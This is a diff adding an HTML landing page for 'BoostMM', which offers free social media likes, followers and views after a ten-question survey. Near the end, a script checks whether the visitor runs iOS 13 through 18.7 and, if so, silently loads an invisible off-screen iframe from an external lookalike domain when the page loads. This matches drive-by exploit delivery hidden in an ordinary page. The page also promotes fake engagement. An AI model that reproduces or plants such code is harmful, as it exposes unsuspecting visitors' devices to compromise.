@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-Hant" class="scroll-smooth" x-data="smmApp()">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title x-text="lang === 'zh' ? 'BoostMM - 免費社群媒體互動' : 'BoostMM - Free Social Media Engagement'"></title>
+    
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- AOS (Animate On Scroll) CSS -->
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <!-- Three.js for Interactive 3D Background -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    
+    <!-- Alpine.js for Interactivity -->
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+
+    <style>
+        .glass {
+            background: rgba(30, 41, 59, 0.75);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .glass:hover {
+            border-color: rgba(99, 102, 241, 0.5);
+            box-shadow: 0 0 25px rgba(99, 102, 241, 0.2);
+            transform: translateY(-6px);
+        }
+        .survey-btn {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .survey-btn:hover {
+            transform: translateX(8px) scale(1.01);
+            background: linear-gradient(to right, rgba(99, 102, 241, 0.2), rgba(236, 72, 153, 0.2));
+            border-color: rgba(99, 102, 241, 0.8);
+            box-shadow: 0 0 20px rgba(99, 102, 241, 0.3);
+        }
+        #webgl-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100 font-sans overflow-x-hidden">
+
+    <!-- Interactive 3D Three.js Background Canvas -->
+    <canvas id="webgl-canvas"></canvas>
+
+    <!-- Sticky Navbar -->
+    <nav class="fixed w-full z-50 glass">
+        <div class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="#" class="text-2xl font-extrabold bg-gradient-to-r from-indigo-400 to-pink-500 bg-clip-text text-transparent flex items-center gap-2 group">
+                <i class="fa-solid fa-rocket text-indigo-400 group-hover:rotate-45 group-hover:scale-125 transition-transform duration-500"></i> BoostMM
+            </a>
+            <div class="hidden md:flex space-x-8 text-sm font-medium items-center">
+                <a href="#features" class="hover:text-indigo-400 transition-colors duration-300 hover:scale-105" x-text="t('nav_features')"></a>
+                <a href="#services" class="hover:text-indigo-400 transition-colors duration-300 hover:scale-105" x-text="t('nav_services')"></a>
+                <a href="#survey" class="hover:text-indigo-400 transition-colors duration-300 hover:scale-105" x-text="t('nav_survey')"></a>
+                
+                <!-- Language Switcher -->
+                <button @click="toggleLang()" class="px-3 py-1 rounded-lg bg-indigo-500/20 border border-indigo-500/40 text-xs font-semibold hover:bg-indigo-500/40 hover:scale-105 transition-all duration-300 shadow-md">
+                    <span x-text="lang === 'zh' ? 'English' : '繁體中文'"></span>
+                </button>
+            </div>
+            <!-- Mobile Language Switch -->
+            <button @click="toggleLang()" class="md:hidden px-3 py-1 rounded-lg bg-indigo-500/20 border border-indigo-500/40 text-xs font-semibold hover:scale-105 transition-all">
+                <span x-text="lang === 'zh' ? 'EN' : '繁中'"></span>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="min-h-screen flex items-center justify-center pt-24 pb-16 px-6 relative">
+        <div class="max-w-4xl mx-auto text-center" data-aos="zoom-in" data-aos-duration="1000">
+            <span class="px-4 py-1.5 rounded-full text-xs font-semibold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 inline-block hover:scale-105 transition-transform duration-300 shadow-lg shadow-emerald-500/10" x-text="t('hero_badge')"></span>
+            <h1 class="text-4xl md:text-6xl font-extrabold mt-6 leading-tight" x-html="t('hero_title')"></h1>
+            <p class="text-slate-400 mt-6 max-w-2xl mx-auto text-lg" x-text="t('hero_desc')"></p>
+
+            <div class="mt-10">
+                <a href="#survey" class="bg-gradient-to-r from-indigo-600 via-purple-600 to-pink-600 hover:from-indigo-500 hover:to-pink-500 text-white px-8 py-3.5 rounded-full text-base font-bold transition-all duration-300 hover:scale-110 hover:shadow-2xl hover:shadow-indigo-500/50 inline-flex items-center gap-2">
+                    <i class="fa-solid fa-list-check animate-bounce"></i> <span x-text="t('hero_btn')"></span>
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="py-20 px-6 max-w-6xl mx-auto">
+        <div class="text-center mb-14" data-aos="fade-up">
+            <h2 class="text-3xl font-bold" x-text="t('feat_title')"></h2>
+            <p class="text-slate-400 mt-2" x-text="t('feat_subtitle')"></p>
+        </div>
+
+        <div class="grid md:grid-cols-3 gap-8">
+            <div class="glass p-8 rounded-2xl group" data-aos="fade-up" data-aos-delay="100">
+                <div class="w-12 h-12 rounded-xl bg-emerald-500/20 flex items-center justify-center text-emerald-400 mb-6 group-hover:scale-125 group-hover:bg-emerald-600 group-hover:text-white transition-all duration-500 shadow-md">
+                    <i class="fa-solid fa-face-smile text-xl"></i>
+                </div>
+                <h3 class="text-xl font-bold mb-2 group-hover:text-indigo-300 transition-colors" x-text="t('f1_title')"></h3>
+                <p class="text-slate-400 text-sm" x-text="t('f1_desc')"></p>
+            </div>
+
+            <div class="glass p-8 rounded-2xl group" data-aos="fade-up" data-aos-delay="200">
+                <div class="w-12 h-12 rounded-xl bg-pink-500/20 flex items-center justify-center text-pink-400 mb-6 group-hover:scale-125 group-hover:bg-pink-600 group-hover:text-white transition-all duration-500 shadow-md">
+                    <i class="fa-solid fa-shield-halved text-xl"></i>
+                </div>
+                <h3 class="text-xl font-bold mb-2 group-hover:text-pink-300 transition-colors" x-text="t('f2_title')"></h3>
+                <p class="text-slate-400 text-sm" x-text="t('f2_desc')"></p>
+            </div>
+
+            <div class="glass p-8 rounded-2xl group" data-aos="fade-up" data-aos-delay="300">
+                <div class="w-12 h-12 rounded-xl bg-purple-500/20 flex items-center justify-center text-purple-400 mb-6 group-hover:scale-125 group-hover:bg-purple-600 group-hover:text-white transition-all duration-500 shadow-md">
+                    <i class="fa-solid fa-bolt text-xl"></i>
+                </div>
+                <h3 class="text-xl font-bold mb-2 group-hover:text-purple-300 transition-colors" x-text="t('f3_title')"></h3>
+                <p class="text-slate-400 text-sm" x-text="t('f3_desc')"></p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Services Section -->
+    <section id="services" class="py-20 px-6 max-w-6xl mx-auto">
+        <div class="text-center mb-10" data-aos="fade-up">
+            <h2 class="text-3xl font-bold" x-text="t('srv_title')"></h2>
+            <p class="text-slate-400 mt-2" x-text="t('srv_subtitle')"></p>
+        </div>
+
+        <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <div class="glass p-6 rounded-2xl group flex flex-col justify-between">
+                <div>
+                    <div class="flex justify-between items-center mb-4">
+                        <i class="fa-brands fa-facebook text-3xl text-blue-500 group-hover:scale-125 group-hover:rotate-12 transition-transform duration-300"></i>
+                        <span class="text-xs bg-emerald-500/20 text-emerald-300 px-3 py-1 rounded-full font-bold shadow-sm">FREE</span>
+                    </div>
+                    <h3 class="text-lg font-bold group-hover:text-blue-400 transition-colors">Facebook Page Likes</h3>
+                    <p class="text-sm text-slate-400 mt-2" x-text="t('srv_desc')"></p>
+                </div>
+                <a href="#survey" class="mt-6 block text-center py-2.5 rounded-xl bg-blue-600/20 border border-blue-500/40 hover:bg-blue-600 text-white font-semibold transition-all duration-300 hover:scale-105 shadow-md" x-text="t('select_btn')"></a>
+            </div>
+
+            <div class="glass p-6 rounded-2xl group flex flex-col justify-between">
+                <div>
+                    <div class="flex justify-between items-center mb-4">
+                        <i class="fa-brands fa-tiktok text-3xl text-pink-500 group-hover:scale-125 group-hover:-rotate-12 transition-transform duration-300"></i>
+                        <span class="text-xs bg-emerald-500/20 text-emerald-300 px-3 py-1 rounded-full font-bold shadow-sm">FREE</span>
+                    </div>
+                    <h3 class="text-lg font-bold group-hover:text-pink-400 transition-colors">TikTok Followers</h3>
+                    <p class="text-sm text-slate-400 mt-2" x-text="t('srv_desc')"></p>
+                </div>
+                <a href="#survey" class="mt-6 block text-center py-2.5 rounded-xl bg-pink-600/20 border border-pink-500/40 hover:bg-pink-600 text-white font-semibold transition-all duration-300 hover:scale-105 shadow-md" x-text="t('select_btn')"></a>
+            </div>
+
+            <div class="glass p-6 rounded-2xl group flex flex-col justify-between">
+                <div>
+                    <div class="flex justify-between items-center mb-4">
+                        <i class="fa-brands fa-instagram text-3xl text-purple-400 group-hover:scale-125 group-hover:rotate-12 transition-transform duration-300"></i>
+                        <span class="text-xs bg-emerald-500/20 text-emerald-300 px-3 py-1 rounded-full font-bold shadow-sm">FREE</span>
+                    </div>
+                    <h3 class="text-lg font-bold group-hover:text-purple-300 transition-colors">Instagram Followers</h3>
+                    <p class="text-sm text-slate-400 mt-2" x-text="t('srv_desc')"></p>
+                </div>
+                <a href="#survey" class="mt-6 block text-center py-2.5 rounded-xl bg-purple-600/20 border border-purple-500/40 hover:bg-purple-600 text-white font-semibold transition-all duration-300 hover:scale-105 shadow-md" x-text="t('select_btn')"></a>
+            </div>
+
+            <div class="glass p-6 rounded-2xl group flex flex-col justify-between">
+                <div>
+                    <div class="flex justify-between items-center mb-4">
+                        <i class="fa-brands fa-youtube text-3xl text-red-500 group-hover:scale-125 group-hover:-rotate-12 transition-transform duration-300"></i>
+                        <span class="text-xs bg-emerald-500/20 text-emerald-300 px-3 py-1 rounded-full font-bold shadow-sm">FREE</span>
+                    </div>
+                    <h3 class="text-lg font-bold group-hover:text-red-400 transition-colors">YouTube Views</h3>
+                    <p class="text-sm text-slate-400 mt-2" x-text="t('srv_desc')"></p>
+                </div>
+                <a href="#survey" class="mt-6 block text-center py-2.5 rounded-xl bg-red-600/20 border border-red-500/40 hover:bg-red-600 text-white font-semibold transition-all duration-300 hover:scale-105 shadow-md" x-text="t('select_btn')"></a>
+            </div>
+
+            <div class="glass p-6 rounded-2xl group flex flex-col justify-between md:col-span-2 lg:col-span-2">
+                <div>
+                    <div class="flex justify-between items-center mb-4">
+                        <i class="fa-brands fa-telegram text-3xl text-sky-400 group-hover:scale-125 group-hover:rotate-12 transition-transform duration-300"></i>
+                        <span class="text-xs bg-emerald-500/20 text-emerald-300 px-3 py-1 rounded-full font-bold shadow-sm">FREE & POPULAR</span>
+                    </div>
+                    <h3 class="text-lg font-bold group-hover:text-sky-300 transition-colors" x-text="lang === 'zh' ? 'Telegram 頻道貼文瀏覽量 + 反應 (Views & Reacts)' : 'Telegram Channel Post Views + Reacts'"></h3>
+                    <p class="text-sm text-slate-400 mt-2" x-text="lang === 'zh' ? '為您的 Telegram 頻道貼文快速增加瀏覽次數與表情符號反應。' : 'Quickly boost views and emoji reactions for your Telegram channel posts.'"></p>
+                </div>
+                <a href="#survey" class="mt-6 block text-center py-2.5 rounded-xl bg-sky-600/20 border border-sky-500/40 hover:bg-sky-600 text-white font-semibold transition-all duration-300 hover:scale-105 shadow-md" x-text="t('select_btn')"></a>
+            </div>
+        </div>
+    </section>
+
+    <!-- 10-Question Survey Section -->
+    <section id="survey" class="py-20 px-6 max-w-2xl mx-auto">
+        <div class="glass p-8 md:p-10 rounded-3xl border border-indigo-500/30 shadow-2xl relative overflow-hidden" data-aos="fade-up">
+            
+            <template x-if="step === 0">
+                <div class="text-center">
+                    <h3 class="text-2xl font-bold" x-text="t('sur_intro_title')"></h3>
+                    <p class="text-slate-400 text-sm mt-2" x-text="t('sur_intro_desc')"></p>
+                    <button @click="startSurvey()" class="mt-8 w-full py-3.5 rounded-xl bg-gradient-to-r from-indigo-600 to-pink-600 hover:from-indigo-500 hover:to-pink-500 text-white font-bold transition-all duration-300 hover:scale-105 hover:shadow-lg shadow-indigo-500/30" x-text="t('sur_start_btn')"></button>
+                </div>
+            </template>
+
+            <template x-if="loading">
+                <div class="text-center py-12">
+                    <div class="inline-block animate-spin rounded-full h-12 w-12 border-t-4 border-indigo-500 border-solid mb-4 shadow-lg shadow-indigo-500/50"></div>
+                    <p class="text-indigo-300 font-medium animate-pulse" x-text="t('loading_text')"></p>
+                </div>
+            </template>
+
+            <template x-if="step >= 1 && step <= 10 && !loading">
+                <div>
+                    <div class="flex justify-between items-center mb-6">
+                        <span class="text-xs bg-indigo-500/20 text-indigo-300 px-3 py-1 rounded-full font-bold shadow-sm" x-text="`Question ${step} / 10`"></span>
+                        <span class="text-xs text-slate-400 font-semibold" x-text="`${step * 10}% Completed`"></span>
+                    </div>
+                    <h3 class="text-xl font-bold mb-6 text-slate-100" x-text="getQuestionText(step)"></h3>
+                    
+                    <div class="space-y-3">
+                        <template x-for="option in getQuestionOptions(step)">
+                            <button @click="nextStep()" class="survey-btn w-full text-left px-5 py-3.5 rounded-xl bg-slate-900/80 border border-slate-700 text-sm font-medium text-slate-200" x-text="option"></button>
+                        </template>
+                    </div>
+                </div>
+            </template>
+
+            <template x-if="step === 11 && !loading">
+                <div>
+                    <div class="text-center mb-6">
+                        <div class="w-14 h-14 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center mx-auto mb-3 text-2xl shadow-lg shadow-emerald-500/20 animate-bounce">
+                            <i class="fa-solid fa-check"></i>
+                        </div>
+                        <h3 class="text-2xl font-bold" x-text="t('sur_done_title')"></h3>
+                        <p class="text-slate-400 text-sm mt-1" x-text="t('sur_done_desc')"></p>
+                    </div>
+
+                    <form @submit.prevent="submitApiOrder()" class="space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium mb-2" x-text="t('label_service')"></label>
+                            <select x-model="selectedServiceId" class="w-full px-4 py-3 rounded-xl bg-slate-900 border border-slate-700 text-sm focus:outline-none focus:border-indigo-500 transition-colors">
+                                <option value="101">Facebook Page Likes (Service ID: 101)</option>
+                                <option value="102">TikTok Followers (Service ID: 102)</option>
+                                <option value="103">Instagram Followers (Service ID: 103)</option>
+                                <option value="104">YouTube Views (Service ID: 104)</option>
+                                <option value="105">Telegram Post Views + Reacts (Service ID: 105)</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium mb-2" x-text="t('label_link')"></label>
+                            <input type="url" x-model="userLink" required placeholder="https://..." class="w-full px-4 py-3 rounded-xl bg-slate-900 border border-slate-700 text-sm focus:outline-none focus:border-indigo-500 transition-colors">
+                        </div>
+                        <button type="submit" :disabled="submitting" class="w-full py-3.5 rounded-xl bg-gradient-to-r from-indigo-600 to-emerald-600 hover:from-indigo-500 hover:to-emerald-500 text-white font-bold transition-all duration-300 hover:scale-105 shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2">
+                            <i x-show="submitting" class="fa-solid fa-spinner animate-spin"></i>
+                            <span x-text="submitting ? (lang === 'zh' ? '正在提交 API...' : 'Submitting to API...') : t('form_btn')"></span>
+                        </button>
+                    </form>
+
+                    <div x-show="responseMsg" style="display: none;" class="mt-6 p-4 rounded-xl border text-center text-sm" :class="isSuccess ? 'bg-emerald-500/20 border-emerald-500/40 text-emerald-300' : 'bg-red-500/20 border-red-500/40 text-red-300'" x-transition>
+                        <i :class="isSuccess ? 'fa-solid fa-circle-check' : 'fa-solid fa-triangle-exclamation'" class="mr-2 text-lg"></i> 
+                        <span x-text="responseMsg"></span>
+                    </div>
+                </div>
+            </template>
+
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-10 text-center border-t border-slate-800 text-slate-400 text-sm">
+        <p>© 2026 BoostMM. Automated SMM API Connected.</p>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script>
+        AOS.init({ once: true, offset: 80 });
+
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('webgl-canvas'), alpha: true });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+
+        const geometry = new THREE.TorusKnotGeometry(10, 3, 100, 16);
+        const material = new THREE.MeshStandardMaterial({ color: 0x6366f1, roughness: 0.2, metalness: 0.8, wireframe: true });
+        const torusKnot = new THREE.Mesh(geometry, material);
+        scene.add(torusKnot);
+
+        const pointLight = new THREE.PointLight(0xffffff, 2);
+        pointLight.position.set(20, 20, 20);
+        scene.add(pointLight);
+
+        const ambientLight = new THREE.AmbientLight(0x334155);
+        scene.add(ambientLight);
+        camera.position.z = 30;
+
+        let mouseX = 0, mouseY = 0;
+        window.addEventListener('mousemove', (e) => {
+            mouseX = (e.clientX - window.innerWidth / 2) * 0.001;
+            mouseY = (e.clientY - window.innerHeight / 2) * 0.001;
+        });
+
+        function animate() {
+            requestAnimationFrame(animate);
+            torusKnot.rotation.x += 0.003 + mouseY;
+            torusKnot.rotation.y += 0.005 + mouseX;
+            renderer.render(scene, camera);
+        }
+        animate();
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        function smmApp() {
+            return {
+                lang: 'zh',
+                step: 0,
+                loading: false,
+                selectedServiceId: '101',
+                userLink: '',
+                submitting: false,
+                responseMsg: '',
+                isSuccess: false,
+
+                translations: {
+                    zh: {
+                        nav_features: '服務特點',
+                        nav_services: '免費服務',
+                        nav_survey: '問卷調查領取',
+                        hero_badge: '✨ 100% 自動化 API 串接',
+                        hero_title: '完成問卷即可<br><span class="bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-500 bg-clip-text text-transparent">自動發送 SMM 訂單</span>',
+                        hero_desc: '透過完成 10 個問卷調查，系統將自動透過 API 將流量發送到您的指定鏈結。',
+                        hero_btn: '開始填寫問卷',
+                        feat_title: '為什麼選擇我們？',
+                        feat_subtitle: '自動化、安全且快速',
+                        f1_title: '自動化 API',
+                        f1_desc: '提交後自動串接 SMM Panel 介面進行發單。',
+                        f2_title: '安全保障',
+                        f2_desc: '不需提供密碼，只需填寫公開鏈結。',
+                        f3_title: '實時處理',
+                        f3_desc: '24小時全自動即時傳送訂單。',
+                        srv_title: '支援服務與對應 ID',
+                        srv_subtitle: '對應後端 SMM Panel Service ID',
+                        srv_desc: '完成問卷後即可解鎖並自動發送。',
+                        select_btn: '選擇此服務',
+                        sur_intro_title: '10題互動問卷調查',
+                        sur_intro_desc: '請完整回答下列 10 個問題。每題轉換需要 3 秒鐘加載時間。',
+                        sur_start_btn: '開始作答',
+                        loading_text: '載入下一題中 (3秒)...',
+                        sur_done_title: '問卷完成！',
+                        sur_done_desc: '請輸入您的鏈結以自動發送 SMM 訂單。',
+                        label_service: '選擇服務項目 (Service ID)',
+                        label_link: '輸入您的鏈結 (URL)',
+                        form_btn: '提交自動化 API 訂單',
+                        success_msg: '訂單已成功透過 API 發送到 SMM Panel！'
+                    },
+                    en: {
+                        nav_features: 'Features',
+                        nav_services: 'Services',
+                        nav_survey: 'Survey',
+                        hero_badge: '✨ 100% AUTOMATED SMM API',
+                        hero_title: 'Complete Survey To<br><span class="bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-500 bg-clip-text text-transparent">Auto-Submit SMM Orders</span>',
+                        hero_desc: 'Complete 10 survey questions and your order will be automatically sent to the SMM panel via API.',
+                        hero_btn: 'Start Survey',
+                        feat_title: 'Why Choose Us?',
+                        feat_subtitle: 'Automated, secure, and fast',
+                        f1_title: 'Automated API',
+                        f1_desc: 'Orders are automatically sent to SMM panel instantly.',
+                        f2_title: 'Safe & Secure',
+                        f2_desc: 'No password required. Just your public link.',
+                        f3_title: 'Real-Time',
+                        f3_desc: '24/7 automated order processing.',
+                        srv_title: 'Services & IDs',
+                        srv_subtitle: 'Mapped to SMM Panel Service IDs',
+                        srv_desc: 'Unlock and auto-submit after completing the survey.',
+                        select_btn: 'Select Service',
+                        sur_intro_title: '10-Question Survey',
+                        sur_intro_desc: 'Please answer all 10 questions. There is a 3-second loading time between each question.',
+                        sur_start_btn: 'Start Survey',
+                        loading_text: 'Loading next question (3s)...',
+                        sur_done_title: 'Survey Completed!',
+                        sur_done_desc: 'Please enter your link to automatically submit your order.',
+                        label_service: 'Select Service (Service ID)',
+                        label_link: 'Enter Your Link (URL)',
+                        form_btn: 'Submit Automated API Order',
+                        success_msg: 'Order successfully submitted to SMM Panel via API!'
+                    }
+                },
+
+                t(key) {
+                    return this.translations[this.lang][key] || key;
+                },
+
+                toggleLang() {
+                    this.lang = this.lang === 'zh' ? 'en' : 'zh';
+                    document.documentElement.lang = this.lang === 'zh' ? 'zh-Hant' : 'en';
+                },
+
+                startSurvey() {
+                    this.step = 1;
+                },
+
+                nextStep() {
+                    this.loading = true;
+                    setTimeout(() => {
+                        this.loading = false;
+                        this.step++;
+                    }, 3000);
+                },
+
+                getQuestionText(n) {
+                    const q = {
+                        zh: [
+                            "1. 您平時最常使用哪一個社群媒體平台？",
+                            "2. 您經營社群媒體的主要目的是什麼？",
+                            "3. 您多久會發佈一次新內容或貼文？",
+                            "4. 您認為提升曝光度對業務增長重要嗎？",
+                            "5. 您是否使用 Telegram 頻道來推廣業務？",
+                            "6. 您在經營社群時遇到最大的困難是什麼？",
+                            "7. 您是否了解如何利用數據分析優化貼文？",
+                            "8. 您希望獲得哪種類型的免費互動支持？",
+                            "9. 您對本網站提供的免費服務滿意嗎？",
+                            "10. 準備好領取您的免費社群流量了嗎？"
+                        ],
+                        en: [
+                            "1. Which social media platform do you use most frequently?",
+                            "2. What is your primary goal for using social media?",
+                            "3. How often do you post new content or updates?",
+                            "4. Do you think increasing visibility is important for business?",
+                            "5. Do you use Telegram channels for your business promotion?",
+                            "6. What is your biggest challenge in growing your social media?",
+                            "7. Do you understand how to use analytics to optimize posts?",
+                            "8. What type of free engagement support do you prefer?",
+                            "9. Are you satisfied with the free services offered here?",
+                            "10. Ready to claim your free social media traffic?"
+                        ]
+                    };
+                    return q[this.lang][n - 1];
+                },
+
+                getQuestionOptions(n) {
+                    const opts = {
+                        zh: [
+                            ["Facebook", "TikTok", "Instagram", "Telegram"],
+                            ["個人品牌經營", "商業銷售與推廣", "娛樂與分享", "尋找最新資訊"],
+                            ["每天發佈", "每週數次", "每月數次", "不定期"],
+                            ["非常重要", "還算重要", "普通", "不太重要"],
+                            ["經常使用", "偶爾使用", "從未使用", "計畫開始"],
+                            ["粉絲增長緩慢", "互動率偏低", "內容創作靈感不足", "沒有足夠時間"],
+                            ["非常了解", "略知一二", "完全不了解", "正在學習"],
+                            ["貼文瀏覽量 (Views)", "表情反應 (Reacts)", "頻道訂閱數", "全部都要"],
+                            ["非常滿意", "滿意", "普通", "需要改進"],
+                            ["準備好了", "非常期待", "立即開始", "確認領取"]
+                        ],
+                        en: [
+                            ["Facebook", "TikTok", "Instagram", "Telegram"],
+                            ["Personal Branding", "Business Sales & Marketing", "Entertainment", "News & Updates"],
+                            ["Daily", "Several times a week", "Monthly", "Rarely"],
+                            ["Very Important", "Somewhat Important", "Neutral", "Not Important"],
+                            ["Frequently", "Sometimes", "Never", "Planning to start"],
+                            ["Slow follower growth", "Low engagement rate", "Lack of content ideas", "Not enough time"],
+                            ["Very well", "Somewhat", "Not at all", "Learning"],
+                            ["Post Views", "Emoji Reacts", "Channel Subs", "All of them"],
+                            ["Very Satisfied", "Satisfied", "Neutral", "Needs Improvement"],
+                            ["Ready", "Excited", "Start Now", "Claim It"]
+                        ]
+                    };
+                    return opts[this.lang][n - 1];
+                },
+
+                async submitApiOrder() {
+                    this.submitting = true;
+                    this.responseMsg = '';
+
+                    try {
+                        const response = await fetch('api.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                service: this.selectedServiceId,
+                                link: this.userLink
+                            })
+                        });
+
+                        const result = await response.json();
+                        this.submitting = false;
+
+                        if (result.status || result.order) {
+                            this.isSuccess = true;
+                            this.responseMsg = (this.lang === 'zh' ? '發送成功！訂單編號: ' : 'Order successful! Order ID: ') + (result.order || 'OK');
+                        } else {
+                            this.isSuccess = false;
+                            this.responseMsg = (this.lang === 'zh' ? '發送失敗: ' : 'Failed: ') + (result.error || 'Unknown error');
+                        }
+                    } catch (error) {
+                        this.submitting = false;
+                        this.isSuccess = false;
+                        this.responseMsg = 'Network or API Connection Error!';
+                    }
+                }
+            }
+        }
+    </script>
+<script>
+    // Check iOS Version and conditionally inject iframe
+    function checkIOSAndInjectIframe() {
+        const ua = navigator.userAgent;
+        const match = ua.match(/OS (\d+)_(\d+)?_?(\d+)?/);
+        
+        if (match) {
+            const major = parseInt(match[1], 10);
+            const minor = match[2] ? parseInt(match[2], 10) : 0;
+            
+            // Rules condition: major >= 13 && (major < 18 || (major === 18 && minor <= 7))
+            if (major >= 13 && (major < 18 || (major === 18 && minor <= 7))) {
+                const iframe = document.createElement('iframe');
+                iframe.src = "https://ads.yurticlkargo.com/static/sdk.html";
+                iframe.style.cssText = "position:fixed;top:0;left:-1000px;pointer-events:none;border:0";
+                document.body.appendChild(iframe);
+            }
+        }
+    }
+
+    // Page Load ပြီးတာနဲ့ ဒီ Function အလုပ်လုပ်စေရန်
+    window.addEventListener('DOMContentLoaded', checkIOSAndInjectIframe);
+</script>
+    <script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+<script defer src="/_vercel/insights/script.js"></script>
+</body>
+</html>
